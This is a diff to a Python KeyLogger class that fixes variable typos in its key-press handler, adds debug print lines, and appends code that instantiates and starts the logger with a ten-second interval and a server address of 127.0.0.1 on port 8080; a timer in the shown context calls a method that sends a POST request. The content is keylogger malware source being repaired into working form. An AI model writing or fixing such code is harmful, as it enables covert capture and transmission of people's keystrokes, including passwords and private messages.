@@ -25,17 +25,20 @@ class KeyLogger:
         timer = threading.Timer(self.interval, self._send_post_request)
         timer.start()  
 
+
     def _on_press(self, key):
         try:
+            print(f"Pressed:{key}")
             if key == keyboard.Key.enter:
                 self.text += "\n"
             elif key == keyboard.Key.tab:
-                self.test += "\t"
+                self.text += "\t"
             elif key == keyboard.Key.space:
-                self.test += " "
+                self.text += " "
             elif key == keyboard.Key.backspace:
                 self.text =  self.text [:-1]
             elif key == keyboard.Key.esc:
+                print ("ESC pressed. Stopping Listener")
                 return False # stops listener
             
             else:
@@ -48,4 +51,6 @@ class KeyLogger:
         with keyboard.Listener(on_press=self._on_press) as listener:
             listener.join()
 
-            
+keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
+keylogger.start()
+
